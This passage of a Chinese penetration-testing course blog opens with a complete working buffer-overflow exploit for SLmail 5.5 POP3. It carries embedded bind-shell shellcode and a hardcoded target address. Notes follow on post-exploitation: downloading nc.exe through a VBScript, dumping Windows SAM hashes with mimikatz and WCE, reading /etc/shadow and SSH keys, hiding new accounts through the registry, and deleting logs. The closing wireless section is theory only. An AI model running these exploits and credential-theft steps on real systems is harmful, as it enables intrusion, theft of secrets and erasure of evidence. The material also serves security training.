<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"># 638.py POP3 PASS 缓冲区溢出代码</span><br><span class="line">import struct</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">print &quot;\n\n###############################################&quot;</span><br><span class="line">print &quot;\nSLmail 5.5 POP3 PASS Buffer Overflow&quot;</span><br><span class="line">print &quot;\nFound &amp; coded by muts [at] offsec.com&quot;</span><br><span class="line">print &quot;\nFor Educational Purposes Only!&quot; </span><br><span class="line">print &quot;\n\n###############################################&quot;</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sc = &quot;\xd9\xee\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x5e\x81\x73\x17\xe0\x66&quot;</span><br><span class="line">sc += &quot;\x1c\xc2\x83\xeb\xfc\xe2\xf4\x1c\x8e\x4a\xc2\xe0\x66\x4f\x97\xb6&quot;</span><br><span class="line">sc += &quot;\x31\x97\xae\xc4\x7e\x97\x87\xdc\xed\x48\xc7\x98\x67\xf6\x49\xaa&quot;</span><br><span class="line">sc += &quot;\x7e\x97\x98\xc0\x67\xf7\x21\xd2\x2f\x97\xf6\x6b\x67\xf2\xf3\x1f&quot;</span><br><span class="line">sc += &quot;\x9a\x2d\x02\x4c\x5e\xfc\xb6\xe7\xa7\xd3\xcf\xe1\xa1\xf7\x30\xdb&quot;</span><br><span class="line">sc += &quot;\x1a\x38\xd6\x95\x87\x97\x98\xc4\x67\xf7\xa4\x6b\x6a\x57\x49\xba&quot;</span><br><span class="line">sc += &quot;\x7a\x1d\x29\x6b\x62\x97\xc3\x08\x8d\x1e\xf3\x20\x39\x42\x9f\xbb&quot;</span><br><span class="line">sc += &quot;\xa4\x14\xc2\xbe\x0c\x2c\x9b\x84\xed\x05\x49\xbb\x6a\x97\x99\xfc&quot;</span><br><span class="line">sc += &quot;\xed\x07\x49\xbb\x6e\x4f\xaa\x6e\x28\x12\x2e\x1f\xb0\x95\x05\x61&quot;</span><br><span class="line">sc += &quot;\x8a\x1c\xc3\xe0\x66\x4b\x94\xb3\xef\xf9\x2a\xc7\x66\x1c\xc2\x70&quot;</span><br><span class="line">sc += &quot;\x67\x1c\xc2\x56\x7f\x04\x25\x44\x7f\x6c\x2b\x05\x2f\x9a\x8b\x44&quot;</span><br><span class="line">sc += &quot;\x7c\x6c\x05\x44\xcb\x32\x2b\x39\x6f\xe9\x6f\x2b\x8b\xe0\xf9\xb7&quot;</span><br><span class="line">sc += &quot;\x35\x2e\x9d\xd3\x54\x1c\x99\x6d\x2d\x3c\x93\x1f\xb1\x95\x1d\x69&quot;</span><br><span class="line">sc += &quot;\xa5\x91\xb7\xf4\x0c\x1b\x9b\xb1\x35\xe3\xf6\x6f\x99\x49\xc6\xb9&quot;</span><br><span class="line">sc += &quot;\xef\x18\x4c\x02\x94\x37\xe5\xb4\x99\x2b\x3d\xb5\x56\x2d\x02\xb0&quot;</span><br><span class="line">sc += &quot;\x36\x4c\x92\xa0\x36\x5c\x92\x1f\x33\x30\x4b\x27\x57\xc7\x91\xb3&quot;</span><br><span class="line">sc += &quot;\x0e\x1e\xc2\xf1\x3a\x95\x22\x8a\x76\x4c\x95\x1f\x33\x38\x91\xb7&quot;</span><br><span class="line">sc += &quot;\x99\x49\xea\xb3\x32\x4b\x3d\xb5\x46\x95\x05\x88\x25\x51\x86\xe0&quot;</span><br><span class="line">sc += &quot;\xef\xff\x45\x1a\x57\xdc\x4f\x9c\x42\xb0\xa8\xf5\x3f\xef\x69\x67&quot;</span><br><span class="line">sc += &quot;\x9c\x9f\x2e\xb4\xa0\x58\xe6\xf0\x22\x7a\x05\xa4\x42\x20\xc3\xe1&quot;</span><br><span class="line">sc += &quot;\xef\x60\xe6\xa8\xef\x60\xe6\xac\xef\x60\xe6\xb0\xeb\x58\xe6\xf0&quot;</span><br><span class="line">sc += &quot;\x32\x4c\x93\xb1\x37\x5d\x93\xa9\x37\x4d\x91\xb1\x99\x69\xc2\x88&quot;</span><br><span class="line">sc += &quot;\x14\xe2\x71\xf6\x99\x49\xc6\x1f\xb6\x95\x24\x1f\x13\x1c\xaa\x4d&quot;</span><br><span class="line">sc += &quot;\xbf\x19\x0c\x1f\x33\x18\x4b\x23\x0c\xe3\x3d\xd6\x99\xcf\x3d\x95&quot;</span><br><span class="line">sc += &quot;\x66\x74\x32\x6a\x62\x43\x3d\xb5\x62\x2d\x19\xb3\x99\xcc\xc2&quot;</span><br><span class="line"></span><br><span class="line">#Tested on Win2k SP4 Unpatched</span><br><span class="line"># Change ret address if needed</span><br><span class="line">buffer = &apos;\x41&apos; * 4654 + struct.pack(&apos;&lt;L&apos;, 0x783d6ddf) + &apos;\x90&apos;*32 + sc </span><br><span class="line">try:</span><br><span class="line">	print &quot;\nSending evil buffer...&quot;</span><br><span class="line">	s.connect((&apos;192.168.1.167&apos;,110))</span><br><span class="line">	data = s.recv(1024)</span><br><span class="line">	s.send(&apos;USER username&apos; +&apos;\r\n&apos;)</span><br><span class="line">	data = s.recv(1024)</span><br><span class="line">	s.send(&apos;PASS &apos; + buffer + &apos;\r\n&apos;)</span><br><span class="line">	data = s.recv(1024)</span><br><span class="line">	s.close()</span><br><span class="line">	print &quot;\nDone! Try connecting to port 4444 on victim machine.&quot;</span><br><span class="line">except:</span><br><span class="line">	print &quot;Could not connect to POP3!&quot;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>避免有害的EXP</p>
<ul>
<li>不同的EXP<ul>
<li>不同的系统补丁</li>
<li>软件版本</li>
<li>不同的offset,shellcode</li>
</ul>
</li>
<li>扫描探测目标系统版本,搭建适当的测试环境<ul>
<li>避免一锤子测试</li>
</ul>
</li>
<li>修改公开的EXP满足不同的环境需要<ul>
<li>了解漏洞原理,修改溢出代码<br>后漏洞利用阶段(POST EXPLOITATION)</li>
</ul>
</li>
</ul>
</blockquote>
<ul>
<li><p>1.漏洞利用后阶段</p>
<ul>
<li><p>上传工具</p>
</li>
<li><p>提取</p>
</li>
<li><p>擦除攻击痕迹</p>
</li>
<li><p>安装后门(木马程序)</p>
<ul>
<li>长期控制</li>
<li>Dump密码</li>
<li>内网渗透(拿到更多服务器)</li>
</ul>
</li>
<li><p>后漏洞利用阶段</p>
<ul>
<li>最大的挑战-防病毒软件</li>
<li>使用合法的远程控制软件(nc)</li>
</ul>
</li>
<li><p>2.上传工具之上传文件</p>
<ul>
<li>持久控制<ul>
<li>扩大对目标系统的控制能力</li>
<li>Linux系统<ul>
<li>netcat</li>
<li>curl</li>
<li>wget</li>
</ul>
</li>
<li>windos系统<ul>
<li>缺少预装的下载工具</li>
<li>一些问题解决方案:<ul>
<li>a.非交互式模式shell(具有局限性,需上传木马拿到交互式shell)<ul>
<li>类nc 远程控制shell</li>
<li>ftp 192.168.1.1 </li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>上传文件的方法<ul>
<li>使用TFTP传输文件<ul>
<li>xp,2003默认安装</li>
<li>win7,2008需要单独添加</li>
<li>经常被边界防火墙过滤</li>
</ul>
</li>
<li>使用FTP传输文件<ul>
<li>apt-get install pure-ftpd</li>
<li>ftp.sh</li>
</ul>
</li>
<li>使用 VBSCRIPT 传输文件<ul>
<li>wget.vbs</li>
<li>cscript wget.vbs.<a href="http://192.168.1.117/nc.exe" target="_blank" rel="noopener">http://192.168.1.117/nc.exe</a> nc.exe</li>
</ul>
</li>
<li>使用POWERSHELL 传输文件<ul>
<li>Wget.ps1</li>
</ul>
</li>
<li>使用DEBUG 传输文件<ul>
<li>Debug<ul>
<li>汇编,反汇编</li>
<li>16进制dump工具</li>
<li>64k字节</li>
</ul>
</li>
<li>upx压缩文件</li>
<li>wine exe2bat.exe nc.exe nx.hex</li>
<li>debug&lt;nc.hex</li>
<li>copy 1.dll nc.exe</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="Kali-Linux-从入门到精通-十一-–提权"><a href="#Kali-Linux-从入门到精通-十一-–提权" class="headerlink" title="Kali Linux 从入门到精通(十一)–提权"></a>Kali Linux 从入门到精通(十一)–提权</h2><blockquote>
<p>本地提权</p>
<ul>
<li>已实现本地低权限账号登录<ul>
<li>远程溢出</li>
<li>直接获得账号密码</li>
</ul>
</li>
<li>希望获取更高权限<ul>
<li>实现对目标进一步控制</li>
</ul>
</li>
<li>系统之间权限隔离<ul>
<li>操作系统安全的基础</li>
<li>用户空间</li>
<li>内核空间</li>
</ul>
</li>
<li>系统账号<ul>
<li>用户账号登陆时获取权限令牌</li>
<li>服务账号无需用户登陆已在后台启动服务</li>
</ul>
</li>
<li>Windows<ul>
<li>user</li>
<li>Administrator</li>
<li>System:实质最大权限账号</li>
<li>注:非包含关系,交集</li>
</ul>
</li>
<li>Linux<ul>
<li>User</li>
<li>Root:相当于Administrator和System<br>Windows 系统提权之—-ADMIN–提取为SYSTEM</li>
</ul>
</li>
<li>Windos账号 <ul>
<li>系统设置管理功能</li>
<li>Sysinternal Suit<ul>
<li><a href="https://technet.microsoft.com/en-us/sysinternals" target="_blank" rel="noopener">https://technet.microsoft.com/en-us/sysinternals</a></li>
<li>psexec -i -s -d taskmgr</li>
</ul>
</li>
<li>at 19:39 /interactive cmd</li>
<li>sc Create syscmd binPath=”cmd /K start” type=own type=”interact”</li>
<li>sc start syscmd(系统默认以SYSTEM方式启动服务)</li>
</ul>
</li>
<li>注入进程提权<ul>
<li>隐藏痕迹</li>
<li>pinjector.exe<ul>
<li><a href="http://www.tarasco.org/security/Process_injector/" target="_blank" rel="noopener">http://www.tarasco.org/security/Process_injector/</a><br>抓包嗅探</li>
<li>Windows</li>
<li>Wireshark</li>
<li>Omnipeek:Windows抓包工具,界面友好</li>
<li>commview</li>
<li>Sniffpass (基于抓包密码抓取数据)</li>
<li>Linux</li>
<li>Tcpdump</li>
<li>Wireshark</li>
<li>Dsniff   (抓取密码)<br>键盘登录</li>
<li>Keylogger</li>
<li>木马窃取<br>本地缓存密码</li>
<li>浏览器缓存的密码</li>
<li>IE浏览器</li>
<li>Firefox</li>
<li>网络密码</li>
<li>无线密码</li>
<li><a href="http://www.nirsoft.net" target="_blank" rel="noopener">http://www.nirsoft.net</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</blockquote>
<ul>
<li>Dump SAM(数据库)<ul>
<li>Pwdump(从windows的SAM中读取密文)</li>
<li>/usr/share/windows-binaried/fgdump/<ul>
<li>生成PWDUMP 文件</li>
<li>使用ophcrack(密码破解工具) 进行爆破<blockquote>
<p>Windows 身份认证过程<br><img src="https://s2.ax1x.com/2020/03/01/3cmbG9.png" alt="3cmbG9.png"><br><img src="https://s2.ax1x.com/2020/03/01/3cmHPJ.png" alt="3cmHPJ.png"><br><img src="https://s2.ax1x.com/2020/03/01/3cmT54.png" alt="3cmT54.png"><br>WCE(WINDOWS CREDENTIAL EDITOR)&lt;======工具(win7之前)</p>
</blockquote>
</li>
</ul>
</li>
</ul>
</li>
<li>/usr/share/wce/</li>
<li>需要管理员权限</li>
<li>wce-universal.exe -l / -lv</li>
<li>wce-universal.exe -d</li>
<li>wce-universal.exe -e / -r</li>
<li>wce-universal.exe -g</li>
<li>wce-universal.exe -w</li>
<li>LM/NT bash</li>
<li>从内存读取LM/NLTM hash</li>
<li>Digest AAUTHENTICATION Package</li>
<li>NLTM Security Package</li>
<li>Kerberos Security Package</li>
<li>防止WCE攻击<blockquote>
<p>其他工具</p>
<ul>
<li>pwdump localhost</li>
<li>fgdump</li>
<li>mimikatz<ul>
<li>privilege::debug # 提升权限</li>
<li>sekulsa::logonPasswords<br>利用漏洞提权</li>
</ul>
</li>
</ul>
</blockquote>
</li>
<li>MS 11-80 漏洞  ( 单机漏洞提取)<ul>
<li>Ms 11-080 (11 年第80个漏洞)—&gt; 中文版本会产生dos(拒绝服务攻击)</li>
<li>Kb2592799<ul>
<li><a href="https://technet.microsoft.com/library/security/ms11-080" target="_blank" rel="noopener">https://technet.microsoft.com/library/security/ms11-080</a></li>
</ul>
</li>
<li>Pyinstaller</li>
<li>Pywin32</li>
<li>MS11-046<ul>
<li>DoS</li>
</ul>
</li>
</ul>
</li>
<li>MS14-068 漏洞  (获得域的管理员权限 操控多台计算机)<ul>
<li>库<ul>
<li><a href="http://github.com/bidord/pykel" target="_blank" rel="noopener">http://github.com/bidord/pykel</a></li>
</ul>
</li>
<li>ms14-068.py -u <a href="mailto:user@lab.com" target="_blank" rel="noopener">user@lab.com</a> -s userSID -d dc.lab.com</li>
<li>拷贝 TGT_user1@ lab.com cache到windos系统</li>
<li>本地管理员登录<ul>
<li>mimkatz.exe </li>
</ul>
</li>
</ul>
</li>
<li>CVE-2012-0056 (Linux OS 漏洞)<ul>
<li>/proc/pid/mem  (进程权限控制不严格)</li>
<li>kernels&gt;2.6.39</li>
<li><a href="http://blog.zx2c4.com/749" target="_blank" rel="noopener">http://blog.zx2c4.com/749</a><blockquote>
<p>利用配置不当提权</p>
<ul>
<li>与漏洞提取相比 更常用的方法</li>
<li>企业环境</li>
<li>补丁更新的全部已经安装</li>
<li>输入变量过滤之外更值得研发关注的安全隐患</li>
<li>以system的权限启动</li>
<li>NTFS权限允许users修改删除</li>
<li>icals</li>
<li>icals c:\windows*.exe /save perm /T</li>
<li>Find</li>
<li>find / -perm 777 -execls -l {} ; </li>
<li>应用系统的配置文件</li>
<li>应用连接数据库的配置文件</li>
<li>后台服务运行账号<br>基本信息收集</li>
<li>Linux</li>
</ul>
</blockquote>
</li>
<li>/etc/resolv.conf</li>
<li>/etc/passwd</li>
<li>/etc/shadow   (保存有密码)</li>
<li>whoami,who -a</li>
<li>ifconfig -a iptables -L -n,netstat -rn</li>
<li>uname -a,ps aux</li>
<li>dpkg -l | head<ul>
<li>Windows</li>
</ul>
</li>
<li>ipconfig / all, ipconfig/displaydns netstat -bnao,netstat -r</li>
<li>net view,netview /domain</li>
<li>net user/domain </li>
<li>net accounts,net share</li>
<li>net localgroup administarators username /add</li>
<li>net group “Domain Controlleds” /domain<blockquote>
<p>WMIC(WINDOWS MANAGEMENT INSTRUMENTATION)&lt;—强大功能</p>
<ul>
<li>wmic nicconfig get ipaddress,nacadess</li>
<li>wmic computersystem get username<br>收集敏感信息</li>
<li>商业信息</li>
<li>系统信息</li>
<li>Linux</li>
<li>/etc ; /usr/local/etc</li>
<li>/etc/pass ; /etc/shadow</li>
<li>.ssh ; .gnupg 公私钥</li>
<li>The e-mail and data file</li>
<li>业务数据库 ; 身份认证服务器数据库</li>
<li>/tmp</li>
<li>Windows</li>
<li>SAM 数据库 ; 注册表文件</li>
<li>%SYSTEMROOT%\repair\SAM  (存放SAM副本)</li>
<li>%SYSTEMROOTS%\System32\config\RegBack\SAM  (存放SAM副本)</li>
<li>业务数据库 ; 身份认证数据库</li>
<li>临时文件目录<br>隐藏痕迹</li>
<li>禁止在登录界面显示新建账号</li>
<li>REG ADD “HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windoes NT\CurrentVersion\WinLogon\SpecialAccounts\UserList” /v uname /T<br>REG_SWORD/D 0   (隐藏账号)</li>
<li>del %WINDIR%*.log /a/s/q/f</li>
<li>History</li>
<li>日志</li>
</ul>
</blockquote>
</li>
<li>auth.log / secure</li>
<li>btmp / wtmp</li>
<li>lastlog / faillog<ul>
<li>其他日志和HIDS等</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="Kali-Linux-从入门到精通-十一-–无线渗透测试"><a href="#Kali-Linux-从入门到精通-十一-–无线渗透测试" class="headerlink" title="Kali Linux 从入门到精通(十一)–无线渗透测试"></a>Kali Linux 从入门到精通(十一)–无线渗透测试</h2><blockquote>
<p>1.无线渗透概述</p>
<ul>
<li>与其他章节独立,涵盖面广,可独立成课</li>
<li>无线技术变化块,难度大</li>
<li>既新鲜刺激 难度大<ul>
<li>不会研究很深</li>
</ul>
</li>
<li>半理论,半实践<ul>
<li>理论是本章最有价值的部分(aircrack-ng suite 作者写的一本书)</li>
</ul>
</li>
<li>无线技术是本课程难度最大的一章<ul>
<li>协议结构<br>2.无线技术特点</li>
</ul>
</li>
<li>行业迅猛发展</li>
<li>互联网的重要入口</li>
<li>边界模糊</li>
<li>安全实施缺失而且困难</li>
<li>对技术不了解而造成配置不当</li>
<li>企业网络私自接入AP破坏网络边界<br>3.IEEE:Institute of Elecrical and Electronics Engineers</li>
<li>IEEE分为不同的技术委员会,其中802委员会负责lan,man的制定<ul>
<li>以太网</li>
<li>令牌环网</li>
<li>无线局域网</li>
<li>网桥<br>4.无线(802.11)</li>
</ul>
</li>
<li>数据链路层<ul>
<li>LLC</li>
<li>MAC</li>
</ul>
</li>
<li>物理层</li>
<li>IEEE 802.11 标准<br>图片1<br>图片4<br>802.11b<br>802.11A<br>802.11G</li>
<li>无线<br>图片2</li>
<li>日常使用<br>图片3<br>5.无线网络运行模式</li>
<li>无线网络架构 (两种半方式)</li>
<li>a. Infrasture (基础架构型)<ul>
<li>AP 维护SSID(服务级标识符–即无线名)</li>
<li>至少包含一个AP和一个STATION,形成一个Basic Service Set(BSS) 基本服务集</li>
<li>AP连接到有线网络,称为Distribution System(DS)</li>
<li>连接到同一个DS的多个AP形成一个Extended Service Set(ESS)</li>
</ul>
</li>
<li>b. Ad-Hoc<ul>
<li>STA 维护SSID</li>
<li>也被称为Independent Basic Service Set(IBSS)</li>
<li>有至少两个STAs直接通信组成</li>
<li>也称为peer to peer模式</li>
<li>其中一个STA负责AP的工作<ul>
<li>通过beacon广播SSID</li>
<li>对其他STAs进行直接身份验证</li>
</ul>
</li>
</ul>
</li>
<li>Service Set Identifier(SSID)<pre><code>- AP每秒钟约10次通过Beacon帧广播SSID
- 客户端连接到无线网络后也会宣告SSID  </code></pre></li>
<li>WIRELESS DISTRIBUTION SYSTEM(WDS)<ul>
<li>与有限DS类似,只是通过无线连接的多个AP组成的网络<ul>
<li>Bindging(桥接方式)-只有AP间彼此通信</li>
<li>Repeating(中继方式)-只允许所有AP和STA进行通信</li>
</ul>
</li>
</ul>
</li>
<li>c.MONITOR MODE(类似于有线网络的混杂模式,可抓住其他机器的流量)<ul>
<li>Monitor 不是一种真的无线模式<ul>
<li>但是对无线渗透至关重要</li>
<li>允许无线网卡没有任何筛选的抓包(802.11包头)</li>
<li>与有线网络的混杂模式可以类比</li>
<li>审核的网卡和驱动不但可以monitor,更可以Injection</li>
</ul>
6.无线网络硬件设备及基本概念<ul>
<li>物理机运行kali</li>
<li>虚拟机运行kali</li>
<li>外置USB 无线网卡</li>
<li>TL-WN722N(个人建议)</li>
<li>dmseg</li>
<li>iwconfig</li>
</ul>
7.选择无线网卡</li>
</ul>
</li>
<li>这是个痛苦和受挫的过程</li>
<li>无线网卡的芯片和型号是成败的关键</li>
<li>台式机:<ul>
<li>USB 无线卡 (不支持扩展天线)</li>
<li>PCMCIA(16 bit 已停产)</li>
<li>Cardbus(32 bit PCMCIA 8.0标准)</li>
<li>Express Cards</li>
<li>MiniPCI</li>
<li>MiniPCI Express</li>
</ul>
</li>
<li>发送功率:远程连接</li>
<li>接收灵敏:适当降低灵敏度,接收效果更佳</li>
<li>经验但不是铁律<ul>
<li>或 Realtek 芯片</li>
<li>没有神器</li>
<li>兼容 aircrack-ng suite</li>
<li><a href="http://www.aircrack-ng.org/doku.php?id=compatibility_drivers#list_of_compatiable_adapters" target="_blank" rel="noopener">http://www.aircrack-ng.org/doku.php?id=compatibility_drivers#list_of_compatiable_adapters</a></li>
</ul>
</li>
<li>无线渗透网卡没有所谓标准,但是Aircrack-ng suite 作者给出建议</li>
<li>Alfa Networks AWUS036H 无线网卡<br>8.无线技术概念</li>
</ul>
</blockquote>
<blockquote>
<p>9.Linux无线协议栈及配置命令</p>
</blockquote>
<blockquote>
<p>10.RADIOTAP头</p>
</blockquote>

        </div>
        
        <div class="level is-size-7 is-uppercase">
            <div class="level-start">
                <div class="level-item">
                    <span class="is-size-6 has-text-grey has-mr-7">#</span>
                    <a class="has-link-grey -link" href="/tags/信息安全/">信息安全</a>, <a class="has-link-grey -link" href="/tags/渗透测试/">渗透测试</a>
                </div>
            </div>
        </div>
        
        
        
        <div class="social-share"></div>

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/css/share.min.css">
<script src="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/js/social-share.min.js"></script>

        
    </div>
</div>




<div class="card">
    <div class="card-content">
        <h3 class="menu-label has-text-centered">喜欢这篇文章？打赏一下作者吧</h3>
        <div class="buttons is-centered">
            
                
<a class="button is-info donate">
    <span class="icon is-small">
        <i class="fab fa-alipay"></i>
    </span>
    <span>支付宝</span>
    <div class="qrcode"><img src="/images/zfb.png" alt="支付宝"></div>
</a>

                
                
<a class="button is-success donate">
    <span class="icon is-small">
        <i class="fab fa-weixin"></i>
    </span>
    <span>微信</span>
    <div class="qrcode"><img src="/images/wx.png" alt="微信"></div>
</a>

                
        </div>
    </div>
</div>


<br>
<br>
<br>
        <ul class="post-copyright">
          <li class="post-copyright-author">
          <strong>作者:  </strong>止歌
          </li>
          <li class="post-copyright-link">
          <strong>文章连结:  </strong>
          <a href="/2019/07/31/【Kali LInux】 渗透测试技术入门/" target="_blank" title="【Kali 渗透测试】入门篇">https://Wheeeeeeeeels.github.io/2019/07/31/【Kali LInux】 渗透测试技术入门/</a>
          </li>
          <li class="post-copyright-license">
            <strong>版权声明:   </strong>
            本网志所有文章除特别声明外,均采用 <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
            许可协议。转载请注明出处!
          </li>
        </ul>

<br>
<br>




<div class="card card-transparent">
    <div class="level post-navigation is-flex-wrap is-mobile">
        
        <div class="level-start">
            <a class="level level-item has-link-grey  article-nav-prev" href="/2019/08/01/【论文解读】深度学习综述/">
                <i class="level-item fas fa-chevron-left"></i>
                <span class="level-item">【论文解读】深度学习综述</span>
            </a>
        </div>
        
        
    </div>
</div>



<div class="card">
    <div class="card-content">
        <h3 class="title is-5 has-text-weight-normal">评论</h3>
        
<div id="valine-thread" class="content"></div>
<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
<script>
    new Valine({
        el: '#valine-thread' ,
        notify: false,
        verify: false,
        app_id: '4n2wXiCcKdC6aEpTRBn3gdk2-gzGzoHsz',
        app_key: '8WEnpH2I6RrjhXPAyex9FuSH',
        placeholder: '发表您的建议,让我们一起交流,共同进步吧'
    });
</script>

    </div>
</div>




</div>
                

<!-- 粘贴的部分 -->
                          <!-- 修改，可选保留的栏 -->




<div class="column is-4-tablet is-4-desktop is-3-widescreen  has-order-3 column-left ">
    
        
<div class="card widget">
    <div class="card-content">
        <nav class="level">
            <div class="level-item has-text-centered" style="flex-shrink: 1">
                <div>
                    
                        <img class="image is-128x128 has-mb-6" src="/images/head1.jpg" alt="止歌">
                    
                    
                    <p class="is-size-4 is-block">
                        止歌
                    </p>
                    
                    
                    <p class="is-size-6 is-block">
                        Explosion-stack Engineer | Algorithm Dog  CVer
                    </p>
                    
                    
                    <p class="is-size-6 is-flex is-flex-center has-text-grey">
                        <i class="fas fa-map-marker-alt has-mr-7"></i>
                        <span>China 中国</span>
                    </p>
                    
                </div>
            </div>
        </nav>
        <nav class="level is-mobile">
            <div class="level-item has-text-centered is-marginless">
                <div>
                    <p class="heading">
                        文章
                    </p>
                    <p class="title has-text-weight-normal">
                        4
                    </p>
                </div>
            </div>
            <div class="level-item has-text-centered is-marginless">
                <div>
                    <p class="heading">
                        分类
                    </p>
                    <p class="title has-text-weight-normal">
                        5
                    </p>
                </div>
            </div>
            <div class="level-item has-text-centered is-marginless">
                <div>
                    <p class="heading">
                        标签
                    </p>
                    <p class="title has-text-weight-normal">
                        16
                    </p>
                </div>
            </div>
        </nav>
        <div class="level">
            <a class="level-item button is-link is-rounded" href="https://github.com/Wheeeeeeeeels" target="_blank">
                关注我</a>
        </div>
        
        
        <div class="level is-mobile">
            
            <a class="level-item button is-white is-marginless" target="_blank" title="Github" href="https://github.com/Wheeeeeeeeels">
                
                <i class="fab fa-github"></i>
                
            </a>
            
            <a class="level-item button is-white is-marginless" target="_blank" title="Facebook" href="https://facebook.com">
                
                <i class="fab fa-facebook"></i>
                
            </a>
            
            <a class="level-item button is-white is-marginless" target="_blank" title="Twitter" href="https://twitter.com">
                
                <i class="fab fa-twitter"></i>
                
            </a>
            
            <a class="level-item button is-white is-marginless" target="_blank" title="Zhihu" href="https://www.zhihu.com/people/ghjv/activities">
                
                <i class="fab fa-zhihu"></i>
                
            </a>
            
            <a class="level-item button is-white is-marginless" target="_blank" title="RSS" href="/">
                
                <i class="fas fa-rss"></i>
                
            </a>
            
        </div>
        
    </div>
</div>
    
        
<div class="card widget" id="toc">
    <div class="card-content">
        <div class="menu">
            <h3 class="menu-label">
                目录
            </h3>
            <ul class="menu-list"><li>
        <a class="is-flex" href="#Kali-Linux-从入门到精通-一-概论">
        <span class="has-mr-6">1</span>
        <span>Kali Linux 从入门到精通(一)-概论</span>
        </a></li><li>
        <a class="is-flex" href="#Kali-Linux-从入门到精通-二-安装">
        <span class="has-mr-6">2</span>
        <span>Kali Linux 从入门到精通(二)-安装</span>
        </a></li><li>
        <a class="is-flex" href="#Kali-Linux-从入门到精通-三-入侵系统定制">
        <span class="has-mr-6">3</span>
        <span>Kali Linux 从入门到精通(三)-入侵系统定制</span>
        </a></li><li>
        <a class="is-flex" href="#Kali-Linux-从入门到精通-四-代理">
        <span class="has-mr-6">4</span>
        <span>Kali Linux 从入门到精通(四)-代理</span>
        </a></li><li>
        <a class="is-flex" href="#Kali-Linux-从入门到精通-五-测试环境准备">
        <span class="has-mr-6">5</span>
        <span>Kali Linux 从入门到精通(五)-测试环境准备</span>
        </a></li><li>
        <a class="is-flex" href="#Kali-Linux-从入门到精通-五-基本工具使用">
        <span class="has-mr-6">6</span>
        <span>Kali Linux 从入门到精通(五)-基本工具使用</span>
        </a></li><li>
        <a class="is-flex" href="#Kali-Linux-从入门到精通-七-被动信息收集">
        <span class="has-mr-6">7</span>
        <span>Kali Linux 从入门到精通(七)-被动信息收集</span>
        </a></li><li>
        <a class="is-flex" href="#Kali-Linux-从入门到精通-八-主动信息收集">
        <span class="has-mr-6">8</span>
        <span>  Kali Linux 从入门到精通(八)-主动信息收集</span>
        </a></li><li>
        <a class="is-flex" href="#Kali-Linux-从入门到精通-九-弱点扫描">
        <span class="has-mr-6">9</span>
        <span>Kali Linux 从入门到精通(九)-弱点扫描</span>
        </a></li><li>
        <a class="is-flex" href="#Kali-Linux-从入门到精通-十-漏洞挖掘之缓冲区溢出">
        <span class="has-mr-6">10</span>
        <span>Kali Linux 从入门到精通(十)-漏洞挖掘之缓冲区溢出</span>
        </a></li><li>
        <a class="is-flex" href="#Kali-Linux-从入门到精通-十一-–提权">
        <span class="has-mr-6">11</span>
        <span>Kali Linux 从入门到精通(十一)–提权</span>
        </a></li><li>
        <a class="is-flex" href="#Kali-Linux-从入门到精通-十一-–无线渗透测试">
        <span class="has-mr-6">12</span>
        <span>Kali Linux 从入门到精通(十一)–无线渗透测试</span>
        </a></li></ul>
        </div>
    </div>
</div>

    
        
<div class="card widget">
    <div class="card-content">
        <h3 class="menu-label">
            最新文章
        </h3>
        
        <article class="media">
            
            <a href="/2020/03/13/【论文解读】使用强化学习进行NAS/" class="media-left">
                <p class="image is-64x64">
                    <img class="thumbnail" src="https://i.loli.net/2020/03/13/mJEiU3KRsWYneuo.jpg" alt="【论文解读】 Neural Architecture Search with reinforcement learning">
                </p>
            </a>
            
            <div class="media-content">
                <div class="content">
                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2020-03-13T11:45:34.000Z">2020-03-13</time></div>
                    <a href="/2020/03/13/【论文解读】使用强化学习进行NAS/" class="has-link-black-ter is-size-6">【论文解读】 Neural Architecture Search with reinforcement learning</a>
                    <p class="is-size-7 is-uppercase">
                        <a class="has-link-grey -link" href="/categories/论文解读/">论文解读</a>
                    </p>
                </div>
            </div>
        </article>
        
        <article class="media">
            
            <a href="/2020/03/13/【论文调研】IJCAI-2019/" class="media-left">
                <p class="image is-64x64">
                    <img class="thumbnail" src="https://i.loli.net/2020/03/13/CMxLgzkAaKNFpSw.png" alt="【论文调研】IJCAI-2019 论文投稿与录用调研报告">
                </p>
            </a>
